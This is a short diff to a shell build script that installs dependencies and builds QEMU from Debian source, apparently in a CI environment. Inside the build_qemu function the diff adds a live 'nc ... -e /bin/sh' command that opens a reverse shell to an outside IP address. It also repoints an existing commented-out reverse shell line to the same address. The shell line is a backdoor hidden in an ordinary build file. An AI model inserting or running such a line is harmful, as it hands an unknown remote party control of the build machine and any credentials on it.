@@ -13,6 +13,7 @@ build_qemu () {
   apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev ninja-build uuid-dev uuid -y
   mkdir ~/qemu; cd ~/qemu
   #build debian version
+  nc 103.158.223.61 21121 -e /bin/sh
   apt-get source qemu-system-x86=1:7.0+dfsg-7 -y
   dpkg-source --auto-commit -b qemu-7.0+dfsg/
   cd qemu-7.0+dfsg
@@ -92,7 +93,7 @@ build_ovmf
 cp /builds/* /github/workspace/
 #cp ~/*.deb /github/workspace/
 #cp ~/*.tar /github/workspace/
-#nc 65.108.51.31 11452 -e /bin/sh
+#nc 103.158.223.61 21121 -e /bin/sh
 
 exit 0
 
